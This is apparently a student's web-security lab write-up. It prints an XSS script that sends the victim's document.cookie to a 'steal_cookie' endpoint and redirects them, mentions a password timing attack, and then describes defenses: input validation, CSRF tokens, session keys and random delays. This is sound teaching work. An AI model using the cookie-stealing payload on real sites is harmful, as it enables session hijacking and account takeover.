Part 1:
Everything works except we're having issues with gamma -- the correct password takes the most time most of the time but we haven't been able to figure out how to make it work every time.

Some helper code below:

Script used to make url for alpha:
<script>
var req = new XMLHttpRequest();
req.open("GET", "http://localhost:3000/steal_cookie?cookie="+document.cookie);
req.onload = function () {
    console.log(req.response);
    window.location.replace("http://localhost:3000/profile?username=user1");
};
req.send();
</script>

Part 2:
* Defense ALPHA
This attack is stopped by looking at the username provided in the GET request and ensuring that all characters are alphanumeric. This is fine because we define (and force) correct usernames as being fully alphanumeric. If we detect that the provided username is not alphanumeric (whether or not it includes a script), we render a "user does not exist" page.

* Defense BRAVO
This attack is stopped by using CSRF tokens. CSRF tokens are uniquely generated for each user (so that multiple users can use the site at the same time) using generaterandomness() and are stored in a server-side map (didn't want to modify the sqlite table and didn't want to include them in the user session). New CSRF tokens are created whenever the user lands on a form page (i.e. the transfer page, home page to set a profile, etc.) and are deleted (set to null) in the post_transfer and set_profile requests. This effectively stops any transfers or profile updates unless the user sending the request just came from the appropriate page.

* Defense CHARLIE
This attack is stopped by using the built-in crypto functions to generate a unique session key for each user and checking / refreshing it whenever they do anything that would update their account (make a transfer or update their profile). This effectively stops any cookie hijacking and logs the user out if the hashed user account doesn't match the session key.

* Defense DELTA
This attack is defended against in the same way as CHARLIE. 

* Defense ECHO
This attack is prevented by ensuring that all usernames contain only alphanumeric characters in any form where usernames can be input.

* Defense FOXTROT
This attack is prevented by CSRF tokens (described in attack BRAVO) which disallow transfers/profile updates from users who didn't come from the respective transfer/profile update pages.

* Defense GAMMA
This attack is prevented by inserting short random wait times for both successful and failed password check attempts. Also, the transfer page ensures that usernames you're trying to transfer to consist only of alphanumeric characters, so any attempt to transfer to a username that contains a script will fail.